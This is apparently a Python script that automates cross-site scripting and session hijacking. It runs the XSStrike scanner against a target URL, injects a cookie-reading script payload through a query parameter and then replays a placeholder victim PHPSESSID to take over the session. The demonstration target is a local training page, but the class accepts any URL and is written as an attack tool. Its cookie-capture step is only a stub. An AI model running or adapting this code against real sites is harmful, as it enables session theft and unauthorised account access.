# -*- coding: utf-8 -*-
# 
# Description: 
# Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. 
# XSStrike is an advanced XSS detection and exploitation suite written in Python. It is designed to detect XSS vulnerabilities by 
# performing a series of payload injections into the target web application. 
# 
# This class utilizes the XSStrike tool to implement session hijacking through Cross-Site Scripting (XSS) exploits. 
# The target web application used for demonstration is "http://127.0.0.1/vulnerabilities/xss_d/". All methods are encapsulated 
# within a requests.Session context.

import requests
import subprocess

class XSSExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def detect_xss(self):
        # Execute XSStrike to detect potential XSS vulnerabilities
        command = [
            "xsstrike", "--crawl", self.target_url, 
            "--output", "xss_report.txt"
        ]
        subprocess.run(command, check=True)
        with open("xss_report.txt", 'r') as report:
            results = report.readlines()
        return results

    def execute_js_payload(self, payload):
        # Example JavaScript payload to simulate session hijacking
        params = {"q": payload}
        response = self.session.get(self.target_url, params=params)
        return response.content

    def hijack_session(self, victim_session_id):
        # Attempt to gain unauthorized access using hijacked session id
        self.session.cookies.set("PHPSESSID", victim_session_id)
        response = self.session.get(self.target_url)
        return response.content

    def main(self):
        detection_result = self.detect_xss()
        if detection_result:
            print("Potential XSS found. Payload will be executed")
            hijack_payload = "<script>document.write(document.cookie)</script>"
            xss_exploit_result = self.execute_js_payload(hijack_payload)
            print(f"XSS Exploit Result: {xss_exploit_result}")
            
            # Assuming `victim_session_id` is captured via some method
            victim_session_id = "captured_session_id_value"
            hijack_result = self.hijack_session(victim_session_id)
            print(f"Hijacked Session Result: {hijack_result}")
        else:
            print("No XSS vulnerabilities detected")

if __name__ == "__main__":
    target = "http://127.0.0.1/vulnerabilities/xss_d/"
    xss_exploit = XSSExploit(target)

    # Detect and execute XSS payload
    xss_exploit.main()
